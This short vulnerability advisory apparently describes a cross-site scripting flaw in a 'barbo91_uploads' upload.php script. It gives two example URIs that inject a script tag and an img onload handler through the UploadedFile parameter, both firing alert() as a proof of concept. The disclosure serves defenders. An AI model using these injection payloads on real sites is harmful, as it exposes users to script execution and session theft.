Attackers can exploit this issue by enticing an unsuspecting user to follow a malicious URI.

The following example URIs are available:

http://www.example.com/barbo91_uploads/upload.php?MAX_FILE_SIZE=1024000&amp;UploadedFile=1&lt;script&gt;alert(213771818860)&lt;/script&gt;

http://www.example.com/barbo91_uploads/upload.php?MAX_FILE_SIZE=1024000&amp;UploadedFile=1&lt;img+src=http://server/Hack.jpg+onload=alert(213771818860)&gt;
